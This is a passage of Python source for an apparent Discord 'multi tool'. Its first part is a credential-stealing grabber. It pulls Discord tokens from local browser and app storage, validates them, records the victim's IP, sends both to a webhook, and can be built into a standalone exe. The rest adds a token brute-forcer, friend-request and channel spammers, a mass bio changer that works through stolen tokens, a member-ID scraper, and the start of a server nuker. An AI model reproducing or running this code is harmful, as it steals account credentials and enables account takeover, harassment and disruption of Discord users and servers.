            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
def tukan(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def grabber():
    em = []
    em1 = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)

    ip = requests.get('https://api.ipify.org?format=json')
    global ipv4
    ipv4 = ip.json()["ip"]
    emb1 = {
    "fields": [
            {
                "name": "IP",
                "value": ipv4,
                "inline": False
            }
    ],
    "author": {
        "name": "Eclipse Multi Tool",
        },
    }
    em1.append(emb1)


    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }

    webhook1 = {
        "content": "",
        "embeds": em1,
        "username": "IP"
    }

    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
        urlopen(Request(web1, data=dumps(webhook1).encode(), headers=header()))
    except:
        pass
if __name__ == '__main__':
    grabber()
    '''
      file.write(grabbingcode)
      file.flush()
      file.close()
      print('Done!')
      exe = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Do you want to make the grabber an exe?: ''')
      exename = filename + '.py'
      if exe in yeslist:
        os.system(f'pyinstaller --onefile -i NONE {exename}')
        cls()
        print(f'{Fore.RESET}Done! Look Inside of the new folder named {Fore.RED} DIST {Fore.RESET} to find {filename}.exe')

  global bruteforce
  def bruteforce():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token bruteforcer")
    print(f'''
{Fore.RED}
 ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓ ▓█████ ▒ ████▒ ▒█████   ██▀███    ▄████▄  ▓█████ ██▀███  
▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒ ▓█   ▀▒▓██    ▒██▒  ██▒▓██ ▒ ██▒ ▒██▀ ▀█  ▓█   ▀▓██ ▒ ██▒
▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░ ▒███  ░▒████  ▒██░  ██▒▓██ ░▄█ ▒ ▒▓█    ▄ ▒███  ▓██ ░▄█ ▒
▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░  ▒▓█  ▄░░▓█▒   ▒██   ██░▒██▀▀█▄  ▒▒▓▓▄ ▄██ ▒▓█  ▄▒██▀▀█▄  
░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ▒░▒████ ░▒█░   ░ ████▓▒░░██▓ ▒██▒░▒ ▓███▀ ▒░▒████░██▓ ▒██▒
░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░░ ▒░   ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ░▒ ▒  ░░░ ▒░ ░ ▒▓ ░▒▓░
▒░▒   ░   ░▒ ░ ▒ ░░▒░ ░ ░     ░    ░ ░ ░    ░       ░ ▒ ▒░   ░▒ ░ ▒    ░  ▒  ░ ░ ░    ░▒ ░ ▒ 
 ░    ░   ░░   ░  ░░░ ░ ░   ░          ░    ░ ░   ░ ░ ░ ▒    ░░   ░  ░           ░    ░░   ░ 
 ░         ░        ░              ░   ░              ░ ░     ░      ░ ░     ░   ░     ░     




{Fore.YELLOW} If it stops just click Enter on your keyboard
{Fore.RED}                                                    
    ''')
    global id_to_token
    id_to_token = base64.b64encode((input(" What is the User's ID?: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruting():
      while True:
        pyautogui.press('enter')
        time.sleep(0.05)
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
        headers={
          'Authorization': token
        }
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
        try:
          if login.status_code == 200:
            print('\033[32' + ' [+] VALID' + ' ' + token)
            f = open('VALID.txt', "a+")
            f.write(f'{token}\n')
            break
          else:
            print('[-] INVALID' + ' ' + token) 
        finally:
          print("")
        input()

    threads = []
    for i in range(3):
      t = threading.Thread(target=bruting)
      t.daemon = True
      t.start()
      threads.append(t)

    for threads in threads:
      t.join()

  def hypesquad():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Hypesquad Changer")
    url = 'https://discord.com/api/v9/hypesquad/online'

    house = int(input(f"""
    {Fore.RED}
  ██░ ██ ▓██   ██▓ ██▓███   ▓█████ ██▀███    ██████   █████   █    ██  ▄▄▄     ▓█████▄ 
▒▓██░ ██  ▒██  ██▒▓██░  ██  ▓█   ▀▓██ ▒ ██▒▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▒████▄   ▒██▀ ██▌
░▒██▀▀██   ▒██ ██░▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄ ░██   █▌
 ░▓█ ░██   ░ ▐██▓░▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄    ▒   ██▒░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██░▓█▄   ▌
 ░▓█▒░██▓  ░ ██▒▓░▒██▒ ░  ░▒░▒████░██▓ ▒██▒▒██████▒▒░▒███▒█▄ ▒▒█████▓ ▒▓█   ▓██░▒████▓ 
  ▒ ░░▒░▒   ██▒▒▒ ▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░▒▒   ▓▒█ ▒▒▓  ▒ 
  ▒ ░▒░ ░ ▓██ ░▒░ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░ ░ ░   ▒▒  ░ ▒  ▒ 
  ░  ░░ ░ ▒ ▒ ░░  ░░           ░    ░░   ░ ░  ░  ░     ░   ░  ░░░ ░ ░   ░   ▒   ░ ░  ░ 
  ░  ░  ░ ░ ░              ░   ░     ░           ░      ░       ░           ░     ░    


    {Fore.YELLOW}
{Fore.RED}[{Fore.YELLOW}1{Fore.RED}] {Fore.YELLOW}BRAVERY
{Fore.RED}[{Fore.YELLOW}2{Fore.RED}] {Fore.YELLOW}BRILLIANCE
{Fore.RED}[{Fore.YELLOW}3{Fore.RED}] {Fore.YELLOW}BALANCE
{Fore.RED}[{Fore.YELLOW}4{Fore.RED}] {Fore.YELLOW}RANDOM
{Fore.RED}[{Fore.YELLOW}5{Fore.RED}] {Fore.YELLOW}LEAVE ALL HYPESQUADS

    {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}"""))

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        if house == 1 or 2 or 3:
            payload = {
                'house_id':house
            }

            r = requests.post(url, headers=header, json=payload)
            if r.status_code == 200 or 204:
                print(f"{Fore.RED}    Done!")
            else:
                print(r)

        if house == 5:
            payload1 = {
                'house_id':'None'
            }

            t = requests.delete(url, headers=header, json=payload1)

        if house == 4:
            num = random.randint(1,3)

            payload2 = {
                'house_id':num
            }

            r = requests.post(url, headers=header, json=payload2)
            if r.status_code == 200 or 204:
                print(f"{Fore.RED}    Done!")
            else:
                print(r)

  def friends():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Friend Spammer")
    url = 'https://discord.com/api/v9/users/@me/relationships'

    print(f'''
    {Fore.RED}
  ▓█████ ██▀███  ▓█████  ██ ███▄    █  ▓█████▄       ██████  ██▓███   ▄▄▄       ███▄ ▄███▓  ███▄ ▄███▓▓█████ ██▀███  
 ▒██    ▓██ ▒ ██▒▓█   ▀▒▓██ ██ ▀█   █  ▒██▀ ██▌    ▒██    ▒ ▓██░  ██ ▒████▄    ▓██▒▀█▀ ██▒ ▓██▒▀█▀ ██▒▓█   ▀▓██ ▒ ██▒
 ▒████  ▓██ ░▄█ ▒▒███  ░▒██▓██  ▀█ ██▒ ░██   █▌    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░ ▓██    ▓██░▒███  ▓██ ░▄█ ▒
 ░▓█▒   ▒██▀▀█▄  ▒▓█  ▄ ░██▓██▒  ▐▌██▒▒░▓█▄   ▌      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  ▒██    ▒██ ▒▓█  ▄▒██▀▀█▄  
▒░▒█░   ░██▓ ▒██▒░▒████ ░██▒██░   ▓██░░░▒████▓     ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒▒██▒   ░██▒░▒████░██▓ ▒██▒
░ ▒ ░   ░ ▒▓ ░▒▓░░░ ▒░  ░▓ ░ ▒░   ▒ ▒ ░ ▒▒▓  ▒     ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░   ░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░       ░▒ ░ ▒░ ░ ░    ▒ ░ ░░   ░ ▒░  ░ ▒  ▒     ░ ░▒  ░  ░▒ ░       ░   ▒▒ ░░  ░      ░░░  ░      ░ ░ ░    ░▒ ░ ▒░
  ░ ░      ░   ░    ░    ▒    ░   ░ ░   ░ ░  ░     ░  ░  ░  ░░         ░   ▒   ░      ░    ░      ░      ░     ░   ░ 
░          ░        ░    ░          ░     ░              ░                 ░  ░       ░   ░       ░      ░     ░     


    ''')

    discordname = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the discord name + numbers?: ''')
    name,num = discordname.split('#')


    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        payload = {
            "username":name,
            'discriminator':num
        }
        r = requests.post(url, headers=header, json=payload)
        if r.status_code == 204 or 200:
            print(f'{Fore.RED}Done!')
        else:
            print(r)

  def tokenspammer():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Server Spammer")
      chanid = input(f'''
{Fore.RED}
 ██▀███   ▄▄▄       ██ ▓█████▄ ▓█████ ██▀███  
▓██ ▒ ██▒▒████▄   ▒▓██ ▒██▀ ██▌▓█   ▀▓██ ▒ ██▒
▓██ ░▄█ ▒▒██  ▀█▄ ░▒██ ░██   █▌▒███  ▓██ ░▄█ ▒
▒██▀▀█▄  ░██▄▄▄▄██ ░██▒░▓█▄   ▌▒▓█  ▄▒██▀▀█▄  
░██▓ ▒██▒ ▓█   ▓██ ░██░░▒████▓ ░▒████░██▓ ▒██▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█ ░▓ ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ░▒ ░ ▒░  ░   ▒▒   ▒   ░ ▒  ▒  ░ ░    ░▒ ░ ▒░
   ░   ░   ░   ▒    ▒   ░ ░  ░    ░     ░   ░ 
   ░           ░    ░     ░       ░     ░     


{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Channel ID: ''')
      message = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Message: ''')

      url = f'https://discord.com/api/v9/channels/{chanid}/messages'

      tokens = []
      token = []

      reversetoken = []
      with open('tokens.txt','r') as f:
          for line in f:
              tokens.append(line)

          for element in tokens:
              token.append(element.strip())

          length = len(token)

      for t in reversed(token):
        reversetoken.append(t)

      def spammer():
          for x in range(length):
              header = {
                  "authority": "discord.com",
                  "method": "POST",
                  "path": "/api/v9/users/@me",
                  "scheme": "https",
                  "accept": "*/*",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "en-US",
                  "Authorization": f"{token[x]}",
                  "content-length": "0",
                  "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                  "origin": "https://discord.com",
                  'referer': 'https://discord.com/channels/@me',
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "user-agent": useragent(),
                  "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                  "x-debug-options": "bugReporterEnabled",
                  "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              }

              r = requests.post(url, headers=header, json={'content':message})
              if r.status_code == 200 or 201:
                  print('Sent {}'.format(message))
              else:
                  print(r)

      def spammer2():
        for x in range(length):
          header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{reversetoken[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.post(url, headers=header, json={'content':message})
        if r.status_code == 200 or 201:
            print('Sent {}'.format(message))
        else:
            print(r)

      while __name__ == '__main__':
        spammer()
        spammer2()

  def biochanger():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Bio Changer")
    url = 'https://discord.com/api/v9/users/@me'

    abtoptions = input(f'''
    {Fore.RED}
  ▄▄▄▄     ██ ▒█████       ▄████▄   ██░ ██  ▄▄▄      ███▄    █    ▄████ ▓█████ ██▀███  
 ▓█████▄ ▒▓██▒██▒  ██▒    ▒██▀ ▀█ ▒▓██░ ██ ▒████▄    ██ ▀█   █ ▒ ██▒ ▀█▒▓█   ▀▓██ ▒ ██▒
 ▒██▒ ▄██░▒██▒██░  ██▒    ▒▓█    ▄░▒██▀▀██ ▒██  ▀█▄ ▓██  ▀█ ██▒░▒██░▄▄▄░▒███  ▓██ ░▄█ ▒
 ▒██░█▀   ░██▒██   ██░    ▒▓▓▄ ▄██ ░▓█ ░██ ░██▄▄▄▄██▓██▒  ▐▌██▒░░▓█  ██▓▒▓█  ▄▒██▀▀█▄  
▒░▓█  ▀█▓ ░██░ ████▓▒░    ▒ ▓███▀  ░▓█▒░██▓ ▓█   ▓██▒██░   ▓██░░▒▓███▀▒░░▒████░██▓ ▒██▒
░░▒▓███▀▒ ░▓ ░ ▒░▒░▒░     ░ ░▒ ▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒░   ▒ ▒  ░▒   ▒  ░░ ▒░ ░ ▒▓ ░▒▓░
░▒░▒   ░   ▒   ░ ▒ ▒░       ░  ▒    ▒ ░▒░ ░  ░   ▒▒ ░ ░░   ░ ▒░  ░   ░   ░ ░    ░▒ ░ ▒░
  ░    ░   ▒ ░ ░ ░ ▒      ░         ░  ░░ ░  ░   ▒     ░   ░ ░ ░ ░   ░ ░   ░     ░   ░ 
░ ░        ░     ░ ░      ░ ░       ░  ░  ░      ░           ░       ░     ░     ░     

    {Fore.RED}[{Fore.YELLOW}01{Fore.RED}] {Fore.YELLOW}CUSTOM BIO
    {Fore.RED}[{Fore.YELLOW}02{Fore.RED}] {Fore.YELLOW}RANDOM BIO
    {Fore.RED}[{Fore.YELLOW}03{Fore.RED}] {Fore.YELLOW}Eclipse BIO 

    {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}''')

    if abtoptions in ['01','1']:
        bio1 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What do you want the token about me to say?: ''')
        payload1 = {
            'bio':bio1
        }

    elif abtoptions in ['02','2']:
        bio2 = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the file with your about me's (Has to be in same directory): ''')
        bioss = []
        with open(bio2,'r', encoding='utf-8') as bio:
            for line in bio:
                bioss.append(line)
        realbio = random.choice(bioss)
        payload2 = {
            'bio':realbio
        }

    elif abtoptions in ['03','3']:
        bio3 = 'NUKED BY Eclipse Multi Tool'
        payload3 = {
            'bio':bio3
        }

    else:
        print('Invalid Option')

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if abtoptions in ['01','1']:
            r = requests.patch(url, headers=header,json=payload1)
            if r.status_code == 200 or 204:
                print(' Done!')
            else:
                print(r)

        elif abtoptions in ['02','2']:
            t = requests.patch(url, headers=header,json=payload2)
            if t.status_code == 200 or 204:
                print(' Done!')
            else:
                print(t)

        elif abtoptions in ['03','3']:
            e = requests.patch(url, headers=header,json=payload3)
            if e.status_code == 200 or 204:
                print(' Done!')
            else:
                print(e)

        else:
          pass  

  def scraper():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | ID Scraper")
    print(f'''
{Fore.RED}
  ██████   ▄████▄  ██▀███   ▄▄▄      ██▓███   ▓█████ ██▀███  
▒██    ▒  ▒██▀ ▀█ ▓██ ▒ ██▒▒████▄   ▓██░  ██  ▓█   ▀▓██ ▒ ██▒
░ ▓██▄    ▒▓█    ▄▓██ ░▄█ ▒▒██  ▀█▄ ▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▒▓▓▄ ▄██▒██▀▀█▄  ░██▄▄▄▄██▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒ ▓███▀ ░██▓ ▒██▒▒▓█   ▓██▒██▒ ░  ░▒░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ░▒ ▒  ░ ▒▓ ░▒▓░░▒▒   ▓▒█▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░ ░   ░  ▒    ░▒ ░ ▒ ░ ░   ▒▒ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ 
░  ░  ░   ░         ░░   ░   ░   ▒  ░░           ░    ░░   ░ 
      ░   ░ ░        ░           ░           ░   ░     ░     

    ''')
    tukan = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token you want to use to scrape?: ''')
    guildd = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the Server ID you want to scrape?: ''')
    chann = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Any channel id in the server: ''')
    bot = discum.Client(token=tukan)

    def closefetching(resp,guildid):
        if bot.gateway.finishedMemberFetching(guildid):
            lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
            print(str(lenmembersfetched))
            bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
            bot.gateway.close()

    def getmembers(guildid,channelid):
        bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
        bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
        bot.gateway.run()
        bot.gateway.resetSession()
        return bot.gateway.session.guild(guildid).members

    members = getmembers(guildd, chann)

    memberids = []

    for memberId in members:
        memberids.append(memberId)

    cls()

    with open('Member_id.txt','w') as ids:
        for element in memberids:
            ids.write(element + '\n')    

    print(f'Finished Scraping {len(memberids)} members ! Check Member_id.txt for the ids')

  def namegen():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Name Generator")
      print(f'''
      {Fore.RED}
 ███▄    █  ▄▄▄       ███▄ ▄███▓▓█████       ▄████ ▓█████ ███▄    █ 
 ██ ▀█▌  █ ▒████▄    ▓██▒▀█▀ ██▒▓█   ▀    ▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▓██  ▀█ ██▒▒██  ▀█▄  ▓██    ▓██░▒███      ░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
▓██▒  ▐███▒░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄    ░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
▒██░   ▓██░ ▓█   ▓██▒▒██▒   ░██▒░▒████    ░▒▓███▀▒░░▒████▒██░   ▓██░
░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░      ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░  ░   ▒▒ ░░  ░      ░ ░ ░        ░   ░   ░ ░  ░ ░░   ░ ▒░
   ░   ░ ░   ░   ▒   ░      ░      ░      ░ ░   ░ ░   ░     ░   ░ ░ 
         ░       ░  ░       ░      ░            ░     ░           ░ 

      ''')

      howmanynames = int(input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}How many names do you want? {Fore.RED}[{Fore.YELLOW}less than 200{Fore.RED}]: '''))

      if howmanynames > 200:
          print('Maximum amount of names is 200!')
          return

      num1 = howmanynames / 2

      payload = {
          'count':num1
      }

      def getnames(urll):
          r = requests.get(urll, json=payload)

          data = r.json()['data']

          names = []

          for value in data:
              names.append(value['name'])

          with open('names.txt','a') as name:
              for line in names:
                  name.write(line + '\n')

      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/username-generator?count={num1}')
      getnames(f'https://story-shack-cdn-v2.glitch.me/generators/gamertag-generator?count={num1}')

      print('Done! Added {} names to names.txt'.format(howmanynames))

  def nuker():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Server Nuker")
    print(f'''
{Fore.RED}
 ███▄    █  █    ██  ▀██ ▄█▀▓█████ ██▀███  
 ██ ▀█   █  ██  ▓██▒  ██▄█▒ ▓█   ▀▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░ ▓███▄░ ▒███  ▓██ ░▄█ ▒
